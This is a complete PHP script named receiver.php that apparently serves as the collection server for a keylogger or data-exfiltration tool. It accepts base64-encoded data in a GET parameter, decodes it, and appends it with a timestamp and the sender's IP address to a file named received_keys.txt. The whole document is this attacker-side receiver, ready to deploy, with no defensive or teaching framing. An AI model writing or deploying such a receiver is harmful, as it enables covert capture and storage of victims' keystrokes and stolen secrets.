<?php
// receiver.php

// Check if 'data' GET parameter exists
if (isset($_GET['data'])) {
    $encoded = $_GET['data'];

    // Decode Base64
    $decoded = base64_decode($encoded);

    // Get timestamp
    $timestamp = date('Y-m-d H:i:s');

    // Get client IP
    $ip = $_SERVER['REMOTE_ADDR'];

    // Format log line
    $logEntry = "[$timestamp][$ip] $decoded" . PHP_EOL;

    // Save to file (append mode)
    $file = 'received_keys.txt';
    file_put_contents($file, $logEntry, FILE_APPEND);

    // Respond with success
    echo "OK";
} else {
    // If no data provided
    echo "No data received.";
}
?>